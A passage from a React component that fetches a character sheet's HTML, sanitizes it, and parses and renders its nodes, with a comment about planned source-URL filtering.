        // hardening #4 when src filtering lands, since same-origin /api/sheets/
        // paths will look distinct from off-origin URLs).
        const cleanHtml = sanitizeBundleHtml(html.split('%ASSETS%').join(assetBase));
        setHtmlString(cleanHtml);
      })
      .catch((e) => setError(e.message));

    return () => {
      if (styleRef.current) { styleRef.current.remove(); styleRef.current = null; }
    };
  }, [sheetId]);

  if (error) {
    return <div className="sheet-error"><h2>Sheet Error</h2><p>{error}</p></div>;
  }
  if (!htmlString || !char) {
    return <div className="sheet-loading">Loading sheet…</div>;
  }

  // ── Parse and walk on every render ────────────────────────────────────────
  const parser = new DOMParser();
  const doc    = parser.parseFromString(htmlString, 'text/html');
  const nodes  = Array.from(doc.body.childNodes)
    .map((node, i) => renderNodeFull(node, char, updateRef, schemaRef, charId, readOnly, i))
    .filter(Boolean);

  // return <div className="sheet-root">{nodes}</div>;
  return <div className="sheet-root" style={{ containerType: 'inline-size', containerName: 'sheet' }}>{nodes}</div>;
}